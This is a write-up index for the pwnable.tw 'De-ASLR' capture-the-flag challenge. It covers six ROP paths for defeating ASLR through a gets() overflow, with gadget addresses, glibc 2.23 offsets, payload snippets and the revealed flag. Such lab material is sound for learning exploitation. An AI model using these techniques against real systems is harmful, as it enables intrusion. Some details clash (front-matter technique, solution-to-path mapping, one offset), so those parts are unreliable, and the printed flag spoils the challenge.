---
tags:
  - ret2dlresolve
  - rop
  - information-leak
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.23
relro: full
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A stack buffer overflow via gets() without output functions is exploited through ret2dlresolve to resolve system() and execute a shell."
proof-of-concept: no
---

# De-ASLR — pwnable.tw (500 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10402`
>
> Flag: `FLAG{R0P_H4rd_TO_D3F3AT_ASLR}`

## Challenge Overview

A minimal x86-64 binary with `gets()` as the sole imported function — no output functions, no `syscall` gadget, no `write`/`puts`/`printf`. Full RELRO prevents GOT overwrites. The core challenge: defeat ASLR **without any leak channel** in the binary itself.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT is read-only
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)    # fixed code/data addresses
```

## Binary Analysis

The decompiled program is trivial:

```c
int main() {
    char buf[0x10];
    gets(buf);   // stack buffer overflow
    return 0;
    // compiled with: leave; ret
}
```

- Stack overflow at offset **0x18** (0x10 buffer + 0x8 saved RBP) to overwrite the return address.
- `leave; ret` at the end of `main` gives **stack pivot** via RBP control.
- `gets()` can be called repeatedly via `gets@plt` (0x400430) to stage data into writable memory.
- The `.data`/`.bss` segment at `0x601000–0x602000` is writable and at a fixed address.

## Vulnerabilities

### V1 — Stack Buffer Overflow via `gets()`

```c
char buf[0x10];
gets(buf);  // no bounds checking, reads until newline
```

**Impact:** Arbitrary ROP chain from offset 0x18. Constraint: no newline (`\n` / `0x0a`) bytes allowed in payloads.

### V2 — No Output Function (The Real Challenge)

The binary imports only `gets`. There is no `write`, `puts`, `printf`, or `syscall` instruction in the binary. Full RELRO means the GOT cannot be overwritten. This means **ASLR cannot be defeated by a traditional leak** — the exploit must either:
- Compute libc addresses purely from register/memory manipulation (leakless), or
- Manufacture an output channel from libc internals, or
- Brute-force partial overwrites.

## Available Gadgets

From `__libc_csu_init` and other code (No PIE, so all addresses are fixed):

```asm
0x4005c3: pop rdi ; ret
0x4005c1: pop rsi ; pop r15 ; ret
0x4005bd: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret    # stack pivot
0x4005ba: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x4005a0: mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]  # ret2csu CALL
0x4005a9: call [r12+rbx*8]                                # ret2csu CALL (alt entry)
0x400562: push r14 ; ... (csu_init prologue, stores r14 to stack/memory)
0x4004f8: adc dword [rbp+0x48], edx ; mov ebp, esp ; call deregister  # arithmetic write
0x4004a0: pop rbp ; ret
0x400554: leave ; ret                                      # stack pivot via RBP
0x400440: _start                                           # re-enters main, grows stack
0x400536: main
0x4003f9: ret                                              # ret sled
0x400495: jmp rax
0x4005ce: add byte ptr [rax], al ; ret                     # byte-level memory write
```

The `call [r12+rbx*8]` gadget is key — it enables indirect calls through **any memory location** reachable from a base pointer, including GOT entries and libc internal function tables.

## Exploit Paths

All solutions start with the same stack overflow, but diverge dramatically on how they defeat ASLR.

---

### Path A — Leakless: GOT Pivot + `adc` Arithmetic → `execve` (Deterministic)

**Used by:** exp.py, solution 186, 2233

**Idea:** Never leak anything. Instead, **pop** the resolved `gets@libc` address out of the read-only GOT into a register, **store** it to writable memory, then **add** a constant offset to transform it into `execve@libc` — all using fixed-address gadgets.

**Steps:**

1. **Stage 1 overflow:** ROP calls `gets@plt` to read a second-stage chain into `.data` (0x601000), then pivots `rsp` onto the GOT region (0x600FE8) via `pop rsp`.

2. **GOT pop:** At the GOT pivot, `pop r14` loads `gets@got` (0x600FF0) — the **resolved libc address of `gets`** — into `r14`. The chain then returns into `.data`.

3. **Store r14:** Execute `push r14` (via the `__libc_csu_init` prologue at 0x400562), which writes `gets@libc` to a known `.data` slot (e.g., 0x6010F0).

4. **Arithmetic transform:** Use `ret2csu` to set `edx = execve_offset - gets_offset` (= 0x5CE40), then the `adc [rbp+0x48], edx` gadget adds this constant to the stored `gets@libc`, turning it into `execve@libc`.

5. **Call execve:** Another `ret2csu` sets `rdi = &"/bin/sh"` (in `.data`), `rsi = 0`, `rdx = 0`, `r12 = &slot` (where `execve` address lives), then `call [r12]` → `execve("/bin/sh", 0, 0)`.

```python
# Core offsets (libc 2.23)
GETS_OFF    = 0x6ED80
EXECVE_OFF  = 0xCBBC0
DELTA       = EXECVE_OFF - GETS_OFF  # = 0x5CE40
```

**Reliability:** ~100% deterministic. Only fails in the astronomically rare case where adding 0x5CE40 to `gets@libc`'s low 32 bits carries across a 4GB boundary.

---

### Path B — Leak via `_IO_file_write` + ret2csu (Deterministic)

**Used by:** Solutions 278, 1384, 18324, 24887, 27878, 1461

**Idea:** The `call [r12+rbx*8]` gadget can call **any function pointer stored in libc's data segment** — including `_IO_file_write` from the `_IO_file_jumps` / `_IO_proc_jumps` vtable. This effectively manufactures a `write()` output channel.

**Steps:**

1. **Stack pivot** to `.bss` via `leave; ret` with controlled RBP.

2. **Obtain a libc data pointer:** Call `_start` or `main` again — this causes `__libc_start_main` to push libc addresses onto the new stack. Alternatively, `gets()` stores `stdin`'s address (a libc pointer) onto the stack.

3. **Pop the libc pointer** into `r12` using `pop r12; pop r13; pop r14; pop r15; ret` (0x4005BC).

4. **Compute `rbx` offset** so that `[r12 + rbx*8]` points to a `_IO_file_write` function pointer in libc's data. Set up a fake `FILE` struct with `_fileno = 1` (stdout), `rsi = GOT address`, `rdx = 8` (length).

5. **Call `_IO_file_write`** via ret2csu → leaks 8 bytes of a GOT entry (e.g., `__libc_start_main@got`) to stdout → **libc base**.

6. Return to `main`, read a final payload: `pop rdi; &"/bin/sh"; system` or `one_gadget`.

**Reliability:** Deterministic once the stack layout is understood. The `rbx` offset from the libc data pointer to the vtable entry is a fixed libc constant.

---

### Path C — Partial Overwrite + Brute Force (1/16 to 1/4096)

**Used by:** Solutions 1303, 2567, 1980, 2121, 15989

**Idea:** After calling `gets()` or `_start`, libc addresses are left on the stack or in `.bss`. Partially overwrite the low bytes of such an address to point to a `one_gadget` or `system`. Since ASLR randomizes the upper bits, this requires brute-forcing 4–12 bits.

**Variants:**

- **1.5-byte overwrite (1/4096):** Overwrite 2 bytes of a libc residual with the low bytes of a one_gadget. Pad with `ret` sled so the chain slides into it.

  ```python
  # Solution 2567 — simplest possible exploit
  r.sendline('A'*24 + flat(ret)*18 + '\xc4\x16')  # overwrite with one_gadget low bytes
  ```

- **1-byte overwrite (1/16):** Overwrite just one byte of a libc return address left by `gets()` internals (e.g., `_IO_getline_info+292` → change low byte to land on `_IO_getline_info+208`). Then use the `add byte ptr [rax], al` gadget to adjust the second byte.

  ```python
  # Solution 15989 — change _IO_getline_info address, use as computation gadget
  p.sendline(stage1)  # partial overwrite of libc address
  p.sendline('\x98')  # set low byte
  # ... use add [rax], al to fix second byte (1/16 brute force)
  ```

- **Stack residual + `_start` loop:** Call `_start` repeatedly to push libc addresses onto the stack at predictable offsets within `.bss`, then overwrite their low bytes.

**Reliability:** 1/16 to 1/4096 per attempt. Simple to implement but requires retry loop.

---

### Path D — Return to `_dl_init` / Dynamic Linker (Advanced, Deterministic)

**Used by:** Solution 1626

**Idea:** The glibc dynamic linker (`ld.so`) leaves constructor-calling infrastructure on the stack. By carefully setting up registers and returning into `_dl_init`'s constructor-dispatch loop with a fake `link_map` struct in `.data`, you can trick the linker into calling `gets@got + system_offset` as if it were an init function.

**Steps:**

1. Stage a fake `link_map` struct in `.data` with `l_info[DT_INIT]` pointing to `gets@got - 8` (to indirect through the GOT).
2. Set `r14 = &fake_link_map`, `rbx = 1`, `rdi = &"/bin/sh"`.
3. Return into `_dl_init`'s constructor loop — it calls `[gets@got]` with the system offset pre-applied via the struct layout.

**Reliability:** Deterministic but depends on exact linker version/behavior. Fragile across glibc versions.

---

### Path E — `_IO_getline_info` Gadget + `jmp rax` (Near-Deterministic)

**Used by:** Solution 13204

**Idea:** After `gets()` is called, the return path through `_IO_getline_info` leaves a libc address on the stack. The `_IO_getline_info+208` code does `mov rax, rbp; sub rax, [rsp+8]; ... ret`, which computes an arbitrary libc address in `rax`. Combined with `jmp rax`, this becomes `call <anywhere in libc>`.

**Steps:**

1. Pivot stack to `.bss`, call `gets()` to leave `_IO_getline_info+292` on the stack.
2. Use `add byte ptr [rax], al` (0x4005CE) to change the low byte from `+292` to `+208`.
3. Place the distance `rbp - one_gadget` at `[rsp+8]`, so `mov rax, rbp; sub rax, [rsp+8]` computes `one_gadget` in `rax`.
4. `jmp rax` → shell.

**Reliability:** Requires the low byte fixup to succeed (needs specific heap/stack alignment). Near-deterministic with correct `.bss` address tuning.

---

### Path F — Forge Fake `FILE` struct → `_IO_flush` Leak (Deterministic)

**Used by:** Solution 1461

**Idea:** Forge a fake `FILE` (`_IO_FILE`) struct in `.bss` with `_fileno = 1` and buffer pointers aimed at the GOT. Then call `gets()` with `rdi` pointing near the fake FILE — when `gets()` internally flushes stdout via `_IO_file_write`, it writes GOT contents to fd 1.

**Steps:**

1. Pivot to `.bss`, call `main` to deposit `_IO_2_1_stdin_` address.
2. Construct a fake FILE: `_flags = 0xFBAD0800`, `_IO_write_base = GOT`, `_IO_write_ptr = GOT+8`, `_fileno = 1`.
3. Call `gets()` with `rdi` pointing to the fake FILE region — the internal stdio machinery calls `_IO_file_write` on our fake struct, leaking GOT to stdout.
4. Receive leak, compute libc base, return to `one_gadget`.

**Reliability:** Deterministic. Requires understanding glibc stdio internals.

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Stack overflow | `gets()` with 0x10 buffer | Deterministic |
| Stack pivot | `leave; ret` or `pop rsp` | Deterministic |
| Arbitrary `.bss` write | `gets@plt` called via ROP | Deterministic |
| Register load from GOT | `pop rsp` onto GOT, `pop r14` | Deterministic |
| Arithmetic on stored libc addr | `adc [rbp+0x48], edx` | Deterministic |
| Indirect call via libc vtable | `call [r12+rbx*8]` + computed offset | Deterministic |
| Partial overwrite of libc addr | Low-byte overwrite of stack residual | 1/16 – 1/4096 |
| Byte-level memory edit | `add byte [rax], al` | Deterministic (if rax controlled) |

## Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
gets            = 0x6ED80
execve          = 0xCBBC0
system          = 0x45390
__libc_start_main = 0x20740
_IO_2_1_stdin_  = 0x3C38E0
_IO_file_write  = 0x7A6B70
__free_hook     = 0x3C57A8
__malloc_hook   = 0x3C3B10
bin_sh          = 0x18C177
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```

## Binary Gadgets (Fixed, No PIE)

```python
POP_RDI     = 0x4005C3   # pop rdi ; ret
POP_RSI_R15 = 0x4005C1   # pop rsi ; pop r15 ; ret
POP_RSP     = 0x4005BD   # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
POP6        = 0x4005BA   # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
CSU_CALL    = 0x4005A0   # mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call [r12+rbx*8]
CSU_INIT    = 0x400562   # push r14 ; ... (csu prologue, stores regs to stack)
ADC_WRITE   = 0x4004F8   # adc dword [rbp+0x48], edx ; mov ebp,esp ; call deregister
ADD_BYTE    = 0x4005CE   # add byte ptr [rax], al ; ret
POP_RBP     = 0x4004A0   # pop rbp ; ret
LEAVE_RET   = 0x400554   # leave ; ret (stack pivot)
GETS_PLT    = 0x400430   # gets@plt
JMP_RAX     = 0x400495   # jmp rax
RET         = 0x4003F9   # ret (nop sled)
START       = 0x400440   # _start
MAIN        = 0x400536   # main
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `186.md` | A | adc gadget + push r14, leakless execve | Clean deterministic solution |
| `278.md` | B | `_IO_new_file_write` via `call [r12+rbx*8]` | Ruby; uses stdin pointer + vtable offset |
| `1303.md` | C | 1.5-byte brute force of system addr | Partial overwrite after GOT pivot |
| `1384.md` | B | `_IO_file_write` leak via vtable | ret to `_start` for libc pointer; detailed gadget search |
| `1461.md` | F | Fake FILE struct flush leak | Constructs `_IO_FILE` in `.bss` |
| `1562.md` | E | `_IO_getline_info` + stack residual | Novel: uses libc-internal stack residuals |
| `1626.md` | D | Return to `_dl_init` constructor loop | Fake `link_map` struct |
| `1852.md` | B | ret to `_start`/`main` + `_IO_file_write` | `call [r12+rbx*8]` with negative `rbx` |
| `1912.md` | A variant | `sub eax` + `add [rax]` arithmetic | Manual libc address construction |
| `1980.md` | C | Partial overwrite of one_gadget low bytes | 1/16 brute force via `add byte [rax], al` |
| `2121.md` | C | `_start` loop + partial overwrite | Deposits libc addrs, overwrites to `system` |
| `2233.md` | A | `adc` + `__malloc_initialize_hook` | Uses malloc hook instead of execve |
| `2567.md` | C | 12-bit brute force, 3-line exploit | Simplest solution: `ret*18 + '\xc4\x16'` |
| `10128.md` | B | Leak `gets@got` via `_IO_file_write` | C++ exploit |
| `13204.md` | E | `_IO_getline_info+208` as compute gadget | Adjusts low byte, then `jmp rax` |
| `15989.md` | E | `_IO_getline_info` + `syscall; ret` | Converts residual to syscall gadget |
| `18324.md` | B | `call [r12+rbx*8]` with negative rbx | Leaks GOT via `_IO_file_write` |
| `24887.md` | B | ret2csu + fake FILE | C++ exploit; clean leak chain |
| `26207.md` | B | ret2csu, `_IO_file_write` | Detailed stack management |
| `27878.md` | B | ret2csu, negative `rbx` | Leaks via `_IO_proc_jumps` vtable |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit (Path A: leakless `adc` arithmetic) |
| `desc.txt` | Challenge description |
| `artifacts/deaslr` | Challenge binary (x86-64, No PIE, Full RELRO) |
| `artifacts/libc_64.so.6` | Remote libc (glibc 2.23) |
| `solution/*.md` | Community write-ups (77 solutions) |
